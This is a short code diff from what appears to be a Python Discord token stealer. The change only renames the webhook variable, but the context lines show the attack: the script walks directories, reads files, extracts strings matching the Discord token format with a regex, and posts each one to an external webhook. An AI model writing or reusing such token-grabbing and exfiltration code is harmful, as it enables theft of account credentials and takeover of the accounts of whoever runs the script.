@@ -22,7 +22,7 @@ for location in dirs:
                 regex = re.findall(r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}", _data.read())
                 if regex:
                     for reg in regex:
-                        post(webhook, reg);
+                        post(WEBHOOK, reg);
             except PermissionError:
                 continue
 input(" Press enter to close" )
